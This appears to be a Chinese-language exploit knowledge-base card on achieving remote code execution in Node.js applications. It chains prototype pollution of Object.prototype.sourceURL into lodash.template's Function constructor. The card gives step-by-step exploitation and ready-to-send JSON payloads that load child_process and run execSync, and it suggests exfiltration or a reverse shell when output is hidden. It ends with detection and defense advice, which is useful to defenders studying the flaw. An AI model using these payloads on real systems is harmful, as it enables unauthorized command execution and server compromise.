---
id: web-nodejs-prototype-pollution-lodash-template-sourceurl-rce
title: lodash.template sourceURL 原型污染注入：换行逃出注释行，Function 构造器执行任意代码
type: scenario
domain: web
path: web/nodejs/prototype-pollution
technique: lodash-template-sourceurl-prototype-pollution-rce
tags:
- nodejs
- prototype-pollution
- lodash
- template-engine
- rce
- javascript
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V501
  verified_at: '2026-11-11T02:18:38+08:00'
  notes: 已对照原文核对：lodash.template 读取 options.sourceURL 拼成 //# sourceURL= 注释、以 \u000a 换行逃出注释并 return 执行、通过 global.process.mainModule.constructor._load 取 child_process 均与原文一致；原文 payload 为返回箭头函数形式，卡内给出等价直接 return 形式并注明未复跑；未实测。
url: /docs/web/nodejs/prototype-pollution/web-nodejs-prototype-pollution-lodash-template-sourceurl-rce/
draft: false
kb_aliases:
- lodash.template sourceURL
- sourceURL 原型污染
- lodash 模板 RCE
- sourceURL 换行注入
- Template options 原型链
---

## 一句话结论

lodash.template 在编译模板时会读取 `options.sourceURL`，把它拼成 `//# sourceURL=<值>\n` 放在 `new Function` 源码的最前面；由于 `'sourceURL' in options` 会沿原型链查找，攻击者只要通过原型污染写入 `Object.prototype.sourceURL`，并在值里用换行（JSON 中 `\u000a`）结束注释行、插入 `return <任意代码>//`，就能让编译出的模板函数在执行模板正文前直接执行攻击者代码。

## 原理

- lodash.template 的编译逻辑大致是：若 options 中存在 `sourceURL`，则 `sourceURL = '//# sourceURL=' + options.sourceURL + '\n'`，随后执行 `Function(importsKeys, sourceURL + 'return ' + source)`，其中 `source` 是模板编译后的函数体。
- 关键点是 `'sourceURL' in options` 使用 `in` 运算符，它会沿原型链查找属性；options 本身即使没有 `sourceURL`，只要 `Object.prototype.sourceURL` 被污染，条件依然成立，污染值被原样拼进动态函数源码。
- 正常用途下 `sourceURL` 只应是一段 URL，写在 `//# sourceURL=` 注释里；但拼接没有任何转义或换行过滤。攻击者在值开头放一个换行符，就能让 `//# sourceURL=` 只注释掉第一行，第二行成为新的 JS 语句。
- 在第二行写 `return <payload>//`：`return` 会让编译出的函数立即返回，跳过后面自动拼接的模板函数体；末尾 `//` 注释掉残留代码，避免语法错误。
- payload 运行在 `Function` 创建的全局作用域中，拿不到模块作用域的 `require`；但可以通过 `global.process.mainModule.constructor._load('child_process')` 调用 Node 的模块加载器执行命令，或用 `process.mainModule.require(...)` 等价路径。
- 该链的成立只需要两件事：用户可控数据能进入深合并并污染 `Object.prototype.sourceURL`；应用使用 lodash.template 编译模板（常见于把 lodash.template 注册为 Express 的模板引擎）。

## 触发条件

- 应用存在原型污染入口：用户 JSON 被 lodash.merge/defaultsDeep 等深合并函数处理，且未过滤 `__proto__`/`constructor`/`prototype`。
- 应用使用 lodash.template 渲染模板（直接调用，或作为 Express `app.engine` 的模板引擎）。
- 模板渲染时 options/data 对象继承自 `Object.prototype`，使被污染的 `sourceURL` 能被 `in` 运算符读到。
- Node 进程有读取目标文件/执行命令的权限。

## 利用步骤

1. 确认污染入口：向接收 JSON 的接口提交 `{"__proto__":{"x":"y"}}` 或 `{"constructor":{"prototype":{"x":"y"}}}`，在后续响应/对象中观察 `x` 是否被继承。
2. 构造 sourceURL 污染 payload，用 `\u000a` 表示换行，`return` 后接命令执行代码，末尾用 `//` 注释残留：
   ```json
   {"__proto__":{"sourceURL":"\u000areturn global.process.mainModule.constructor._load('child_process').execSync('id').toString()//"}}
   ```
3. POST 到触发 merge 的接口（Content-Type: application/json），确认污染写入。
4. 访问任意会调用 lodash.template 渲染的页面/接口，触发模板编译；动态函数执行 payload，命令输出进入响应。
5. 无回显时改用写文件、DNS/HTTP 外带或反弹 shell；命令中的引号需要按 JSON 转义。
6. 若 `__proto__` 被过滤，改用 `constructor.prototype.sourceURL` 或嵌套键（见关联的过滤绕过卡）。

## PoC

```json
{"__proto__":{"sourceURL":"\u000areturn global.process.mainModule.constructor._load('child_process').execSync('id').toString()//"}}
```

等价的 `constructor.prototype` 形式：

```json
{"constructor":{"prototype":{"sourceURL":"\u000areturn global.process.mainModule.constructor._load('child_process').execSync('id').toString()//"}}}
```

拼接后的动态函数体示意：

```javascript
//# sourceURL=
return global.process.mainModule.constructor._load('child_process').execSync('id').toString()//
return function(obj){ /* 模板正文，已不可达 */ }
```

说明：PoC 按 lodash.template 的 `sourceURL` 拼接逻辑构造，未在目标环境复跑；实际命令与回显方式按目标环境调整。

## 变体与关联

- 变体：payload 不直接 `return` 命令结果，而是 `return e=>{...}` 返回一个函数，再由调用方触发；这种形式依赖上层如何使用模板返回值，稳定性不如直接 return。
- 变体：有 .proto/模板选项过滤时，把 `sourceURL` 换成其他被 lodash.template 读取的选项（如 `imports`、`variable`）通常不行；核心是找“被拼进动态函数源码”的配置项。
- 关联：[[web-nodejs-prototype-pollution-lodash-ejs-escapefunction-rce]]（同一 lodash 污染原语，EJS escapeFunction gadget）；[[web-nodejs-prototype-pollution-merge-json-parse]]（`__proto__` 作为自有键进入 merge 的基础）；[[web-nodejs-prototype-pollution-filter-bypass]]（`constructor.prototype`、Unicode、表单等绕过方式）。
- 边界：lodash 升级/模板选项被白名单过滤、应用不使用 lodash.template、模板渲染不继承被污染的原型、或 payload 中的换行被过滤时，链路失效。

## 检测与防御

- 升级 lodash 到修复版本；不要在模板 options 中透传用户可控对象。
- 对进入深合并的用户 JSON 递归拒绝 `__proto__`、`constructor`、`prototype`；用 `Object.create(null)` 或 `Map` 接收用户数据。
- 模板层：不要把用户数据直接作为 options 传给 lodash.template；如需 sourceURL，只允许由代码内部生成并做 URL 字符白名单校验。
- 检测：请求体中出现 `sourceURL`、`__proto__`、`constructor`+`prototype` 组合；Node 进程出现异常 `child_process` 调用；模板编译/渲染接口返回命令输出特征。
- 响应：重启 Node 进程清除原型污染，排查是否已写入持久化或横向移动。
